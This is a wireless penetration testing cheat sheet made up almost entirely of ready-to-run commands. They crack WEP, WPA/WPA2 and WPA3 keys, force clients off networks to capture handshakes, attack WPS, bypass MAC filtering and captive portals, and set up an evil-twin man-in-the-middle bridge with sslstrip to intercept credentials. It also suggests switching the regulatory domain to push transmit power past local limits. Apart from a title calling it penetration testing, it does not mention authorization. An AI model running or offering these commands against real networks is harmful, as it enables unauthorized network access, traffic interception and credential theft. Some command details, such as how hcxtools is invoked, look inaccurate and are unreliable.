# Wireless Penetration Testing Cheat Sheet
Current Date - March 03, 2025

Note - Commands assume a Linux environment (e.g., Kali Linux) with tools like aircrack-ng, reaver, pyrit, hashcat, etc., installed. Replace wlan0/wlan0mon with your wireless interface. Ensure your adapter supports monitor mode and packet injection (e.g., Alfa AWUS036NHA).

## PREPARATION
Verify Wireless Interface
Check available interfaces

iwconfig

Kill interfering processes

airmon-ng check kill

Verify adapter capabilities

iw list

Enable Monitor Mode
ifconfig wlan0 down

airmon-ng start wlan0

Confirms wlan0mon is created

iwconfig wlan0mon mode monitor

ifconfig wlan0mon up

## Increase Wi-Fi TX Power (Optional)
Set regulatory domain (e.g., Bolivia for higher power)

iw reg set BO

Adjust TX power (max varies by adapter/country)

iwconfig wlan0mon txpower 30 - 30 dBm if supported

iwconfig - Verify

## Change Wi-Fi Channel
Set specific channel (1-14 for 2.4 GHz, higher for 5 GHz)

iwconfig wlan0mon channel <Channel>

## WIRELESS RECONNAISSANCE
Scan for Networks
Broad scan (all channels, 2.4/5 GHz)

airodump-ng wlan0mon

Targeted scan (specific AP)

airodump-ng -c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon

Output saved as <FileName-01.cap> (PCAP format)

Note encryption type (WEP/WPA/WPA2/WPA3)

## Find Hidden SSID
Deauthenticate clients to reveal SSID

airodump-ng -c <Channel> --bssid <BSSID> wlan0mon

aireplay-ng -0 20 -a <BSSID> -c <VictimMac> wlan0mon

Watch airodump-ng for SSID to appear

## Identify Victim MAC
From airodump-ng output, note client MAC under "STATION" column

Filter active clients with strong signal

## WEP CRACKING
Method 1 - Fake Authentication Attack
airmon-ng start wlan0

airodump-ng -c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon

Check your MAC

macchanger --show wlan0mon

aireplay-ng -1 0 -a <BSSID> -h <OurMac> -e <ESSID> wlan0mon

aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b <BSSID> -h <OurMac> wlan0mon

aircrack-ng -b <BSSID> <FileName-01.cap>

### Method 2 - ARP Replay Attack
airmon-ng start wlan0

airodump-ng -c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon

macchanger --show wlan0mon

aireplay-ng -3 -x 1000 -n 1000 -b <BSSID> -h <OurMac> wlan0mon

aircrack-ng -b <BSSID> <FileName-01.cap>

### Method 3 - Chop Chop Attack
airmon-ng start wlan0

airodump-ng -c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon

macchanger --show wlan0mon

aireplay-ng -1 0 -e <ESSID> -a <BSSID> -h <OurMac> wlan0mon

aireplay-ng -4 -b <BSSID> -h <OurMac> wlan0mon

When prompted, press 'y' to use packet; generates <replay_dec-.xor>

packetforge-ng -0 -a <BSSID> -h <OurMac> -k 255.255.255.255 -l 255.255.255.255 -y replay_dec-.xor -w <FileName2>

aireplay-ng -2 -r <FileName2> wlan0mon

aircrack-ng <FileName-01.cap>

### Method 4 - Fragmentation Attack
airmon-ng start wlan0

airodump-ng -c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon

macchanger --show wlan0mon

aireplay-ng -1 0 -e <ESSID> -a <BSSID> -h <OurMac> wlan0mon

aireplay-ng -5 -b <BSSID> -h <OurMac> wlan0mon

Press 'y' when prompted; generates <frag-.xor>

packetforge-ng -0 -a <BSSID> -h <OurMac> -k 255.255.255.255 -l 255.255.255.255 -y frag-.xor -w <FileName2>

aireplay-ng -2 -r <FileName2> wlan0mon

aircrack-ng <FileName-01.cap>

### Method 5 - SKA (Shared Key Authentication) Cracking
airmon-ng start wlan0

airodump-ng -c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon

aireplay-ng -0 10 -a <BSSID> -c <VictimMac> wlan0mon

ifconfig wlan0mon down

macchanger --mac <VictimMac> wlan0mon

ifconfig wlan0mon up

aireplay-ng -3 -b <BSSID> -h <FakedMac> wlan0mon

aireplay-ng --deauth 1 -a <BSSID> -h <FakedMac> wlan0mon

aircrack-ng <FileName-01.cap>

#### WPA/WPA2 CRACKING
Method 1 - WPS Attack
Check for WPS-enabled APs

wash -i wlan0mon -C

Crack WPS

reaver -i wlan0mon -b <BSSID> -vv -S

Specific PIN attack (if known)

reaver -i wlan0mon -c <Channel> -b <BSSID> -p <PinCode> -vv -S

Note - AP must support WPS; use --delay or --lock-delay if locked out

### Method 2 - Dictionary Attack (aircrack-ng)
airmon-ng start wlan0

airodump-ng -c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon

aireplay-ng -0 10 -a <BSSID> -c <VictimMac> wlan0mon - Capture handshake

aircrack-ng -w <WordlistFile> -b <BSSID> <FileName-01.cap>

### Method 3 - Crack with Hashcat (Modern GPU Attack)
airmon-ng start wlan0

airodump-ng -c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon

aireplay-ng -0 10 -a <BSSID> -c <VictimMac> wlan0mon - Capture handshake

Convert cap to hccapx (for Hashcat)

hcxtools -o <FileName>.hccapx <FileName-01.cap>

Crack with Hashcat

hashcat -m 2500 -a 0 <FileName>.hccapx <WordlistFile> --force

Show cracked key

hashcat -m 2500 <FileName>.hccapx --show

### Method 4 - Crack with John The Ripper
airmon-ng start wlan0

airodump-ng -c <Channel> --bssid <BSSID> -w <FileName> wlan0mon

aireplay-ng -0 10 -a <BSSID> -c <VictimMac> wlan0mon

Convert cap to John format

aircrack-ng <FileName-01.cap> -J <JohnFile>

cd /pentest/passwords/john

./john --wordlist=<Wordlist> --rules <JohnFile>

### Method 5 - Crack with coWPAtty
airmon-ng start wlan0

airodump-ng -c <Channel> --bssid <BSSID> -w <FileName> wlan0mon

aireplay-ng -0 10 -a <BSSID> -c <VictimMac> wlan0mon

cowpatty -r <FileName-01.cap> -f <Wordlist> -s <ESSID>

Precompute hashes (faster cracking)

genpmk -s <ESSID> -f <Wordlist> -d <HashesFileName>

cowpatty -r <FileName-01.cap> -d <HashesFileName> -s <ESSID>

### Method 6 - Crack with Pyrit
Prerequisite - Install Pyrit with GPU support (apt-get install pyrit)

airmon-ng start wlan0

airodump-ng -c <Channel> --bssid <BSSID> -w <FileName> wlan0mon

aireplay-ng -0 10 -a <BSSID> -c <VictimMac> wlan0mon

pyrit -r <FileName-01.cap> -b <BSSID> -i <Wordlist> attack_passthrough

Precompute database

pyrit -i <Wordlist> import_passwords

pyrit -e <ESSID> create_essid

pyrit batch

pyrit -r <FileName-01.cap> attack_db

### Method 7 - Precomputed WPA Keys Database Attack
airmon-ng start wlan0

airodump-ng -c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon

aireplay-ng -0 10 -a <BSSID> -c <VictimMac> wlan0mon

echo "<ESSID>" > ESSID.txt

airolib-ng NEW_DB --import essid ESSID.txt

airolib-ng NEW_DB --import passwd <DictionaryFile>

airolib-ng NEW_DB --clean all

airolib-ng NEW_DB --batch

airolib-ng NEW_DB --stats

airolib-ng NEW_DB --verify all

aircrack-ng -r NEW_DB <FileName-01.cap>

#### WPA3 CONSIDERATIONS (Limited as of 2025)
### Reconnaissance
Check for WPA3 with airodump-ng (shows "WPA3" or "SAE" in encryption)

### Dragonfly Handshake Attack
Capture handshake

airodump-ng -c <Channel> --bssid <BSSID> -w <FileName> wlan0mon

aireplay-ng -0 10 -a <BSSID> -c <VictimMac> wlan0mon

Convert to Hashcat format

hcxtools -o <FileName>.hc22000 <FileName-01.cap>

Crack (requires strong GPU and wordlist)

hashcat -m 22000 -a 0 <FileName>.hc22000 <WordlistFile>

Note - WPA3 is resistant; success depends on weak passwords

### BYPASS DEFENSES
Bypass MAC Filtering
airmon-ng start wlan0

airodump-ng -c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon

aireplay-ng -0 10 -a <BSSID> -c <VictimMac> wlan0mon

ifconfig wlan0mon down

macchanger --mac <VictimMac> wlan0mon

ifconfig wlan0mon up

aireplay-ng -3 -b <BSSID> -h <FakedMac> wlan0mon

### Bypass Open Network (Captive Portal)
Connect to open AP

iwconfig wlan0 essid <ESSID>

dhclient wlan0

Spoof MAC if filtered

macchanger --mac <VictimMac> wlan0

Use browser to bypass portal or intercept creds with MITM

### MAN-IN-THE-MIDDLE (MITM) ATTACK
Prerequisite - Install bridge-utils (apt-get install bridge-utils)

airmon-ng start wlan0

airbase-ng -e "<FakeESSID>" wlan0mon - Creates at0 interface

brctl addbr mitm-bridge

brctl addif mitm-bridge wlan0mon

brctl addif mitm-bridge at0

ifconfig wlan0mon 0.0.0.0 up

ifconfig at0 0.0.0.0 up

ifconfig mitm-bridge up

aireplay-ng --deauth 0 -a <VictimBSSID> wlan0mon - Continuous deauth

dhclient mitm-bridge & - Get IP from real network

wireshark & - Select mitm-bridge interface

Optional - SSLstrip or intercept creds

sslstrip -l 8080 &

### POST-EXPLOITATION
Connect to Network (WEP)
ifconfig wlan0mon down

iwconfig wlan0 mode managed

ifconfig wlan0 up

iwconfig wlan0 essid <ESSID> key <CrackedKey>

dhclient wlan0

Connect to Network (WPA/WPA2)
ifconfig wlan0mon down

iwconfig wlan0 mode managed

ifconfig wlan0 up

wpa_passphrase <ESSID> <CrackedKey> > wpa.conf

wpa_supplicant -i wlan0 -c wpa.conf &

dhclient wlan0

#### Connect to Network (WPA3)
Same as WPA2, use cracked key in wpa_supplicant

### Cleanup
Stop monitor mode

airmon-ng stop wlan0mon

ifconfig wlan0 up

service network-manager restart

#### TROUBLESHOOTING
Monitor mode fails - Verify adapter supports monitor mode (iw list)

No handshake captured - Increase deauth count (-0 20) or target multiple clients

TX power not changing - Check regulatory domain (iw reg get) and adapter specs

WPS locked - Adjust reaver delay (--delay=5) or try later

Hashcat fails - Install GPU drivers (e.g., NVIDIA CUDA) 
